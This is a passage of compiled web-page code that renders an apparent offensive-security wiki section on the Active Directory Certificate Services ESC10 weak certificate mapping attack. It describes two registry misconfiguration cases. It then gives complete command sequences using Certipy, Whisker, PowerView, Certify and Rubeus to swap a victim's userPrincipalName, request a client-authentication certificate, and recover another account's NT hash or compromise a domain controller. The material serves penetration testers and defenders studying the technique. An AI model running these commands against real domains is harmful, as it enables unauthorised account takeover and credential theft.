/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN_CONTROLLER"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"show")])])])],-1)])),_:1})]),_:1}),s[29]||(s[29]=n('<h3 id="esc10-weak-certificate-mapping" tabindex="-1">(ESC10) Weak certificate mapping <a class="header-anchor" href="#esc10-weak-certificate-mapping" aria-label="Permalink to &quot;(ESC10) Weak certificate mapping&quot;">​</a></h3><p>To understand this privilege escalation, it is recommended to know how certificate mapping is performed. It is presented in <a href="./certificate-templates#certificate-mapping">this section</a>.</p><p>This ESC refers to a weak configuration of the registry keys:</p><h4 id="case-1" tabindex="-1">Case 1 <a class="header-anchor" href="#case-1" aria-label="Permalink to &quot;Case 1&quot;">​</a></h4><ul><li><code>StrongCertificateBindingEnforcement</code> set to <code>0</code>, meaning no strong mapping is performed</li><li>A template that specifiy client authentication is enabled (any template, like the built-in <code>User</code> template)</li><li><code>GenericWrite</code> right against any account A to compromise any account B</li></ul><div class="warning custom-block"><p>At the time of writting (06/08/2022), there is no solution as a low privileged user to read the <code>StrongCertificateBindingEnforcement</code> value. It is worth to try the attack hopping the key is misconfigured.</p></div>',6)),t(h,null,{default:a(()=>[t(l,{label:"Unix-like"},{default:a(()=>s[6]||(s[6]=[i("p",null,[e("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to enumerate for, and conduct, the ESC10 scenario.")],-1),i("p",null,[e("In this scenario, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and want to compromise user3.")],-1),i("p",null,[e("First, the user2's hash is needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," shadow"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auto"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2")])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to user3.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user3")])])])],-1),i("p",null,"A certificate permitting client authentication can be requested as user2.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'User'")])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[e("Now, authenticating with the obtained certificate will provide the user3's NT hash with "),i("a",{href:"./../kerberos/unpac-the-hash"},"UnPac the hash"),e(". The domain must be specified since it is not present in the certificate.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auth"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pfx"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'user3.pfx'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),e(" flag can be used to set whether to use LDAP or LDAPS")])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[7]||(s[7]=[i("p",null,[e("From Windows systems, the "),i("a",{href:"https://github.com/GhostPack/Certify",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) tool can be used.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using default low-privileged group")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," find "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"currentuser")])])])],-1),i("p",null,[e("Here, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and want to compromise user3.")],-1),i("p",null,[e("First, the user2's credentials are needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example. Here just the "),i("code",null,"msDs-KeyCredentialLink"),e(" modification part with "),i("a",{href:"https://github.com/eladshamir/Whisker",target:"_blank",rel:"noreferrer"},"Whisker"),e(":")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Whisker.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," add "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"target:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user2"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN_CONTROLLER"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"path:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cert.pfx"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"pfx-password"')])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to user3 with "),i("a",{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",target:"_blank",rel:"noreferrer"},"PowerView"),e(".")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user3'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,"A certificate permitting client authentication can be requested in a user2 session.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'domain\\ca'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"User"')])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Set-DomainObject"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," user2 "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Set "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"{"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'userPrincipalName'"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'user2@dmain.local'"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"} "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"Verbose")])])])],-1),i("p",null,[e("Now, authenticating with the obtained certificate will provide the user3's NT hash during "),i("a",{href:"./../kerberos/unpac-the-hash"},"UnPac the hash"),e(". This action can be realised with "),i("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),e(". The domain must be specified since it is not present in the certificate.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," asktgt "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"getcredentials "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"certificate:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"BASE64_CERTIFICATE"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"CERTIFICATE_PASSWORD"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain.local"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"dc:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN_CONTROLLER"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"show")])])])],-1)])),_:1})]),_:1}),s[30]||(s[30]=n('<h4 id="case-2" tabindex="-1">Case 2 <a class="header-anchor" href="#case-2" aria-label="Permalink to &quot;Case 2&quot;">​</a></h4><ul><li><code>CertificateMappingMethods</code> is set to <code>0x4</code>, meaning no strong mapping is performed and only the UPN will be checked</li><li>A template that specifiy client authentication is enabled (any template, like the built-in <code>User</code> template)</li><li><code>GenericWrite</code> right against any account A to compromise any account B without a UPN already set (machine accounts or buit-in Administrator account for example)</li></ul><div class="warning custom-block"><p>At the time of writting (06/08/2022), there is no solution as a low privileged user to read the <code>CertificateMappingMethods</code> value. It is worth to try the attack hopping the key is misconfigured.</p></div>',3)),t(h,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[8]||(s[8]=[i("p",null,[e("From UNIX-like systems, "),i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to enumerate for, and conduct, the ESC10 scenario.")],-1),i("p",null,[e("In this scenario, user1 has "),i("code",null,"GenericWrite"),e(" against user2 and want to compromise the domain controller DC$@domain.local.")],-1),i("p",null,[e("First, the user2's hash is needed. It can be retrieved via a "),i("a",{href:"./../kerberos/shadow-credentials"},"Shadow Credentials"),e(" attack, for example.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," shadow"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," auto"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2")])])])],-1),i("p",null,[e("Then, the "),i("code",null,"userPrincipalName"),e(" of user2 is changed to DC$@domain.local.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DC'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,"A certificate permitting client authentication can be requested as user2.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -hash"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'User'")])])])],-1),i("p",null,"The user2's UPN is changed back to something else.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," update"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -username"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user1@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user2"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -upn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "user2@'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[e("Now, authentication with the obtained certificate will be performed through Schannel. The "),i("code",null,"-ldap-shell"),e(" option can be used to execute some LDAP requests and, for example, realised an "),i("a",{href:"./../kerberos/delegations/rbcd"},"RBCD"),e(" to fully compromised the domain controller.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 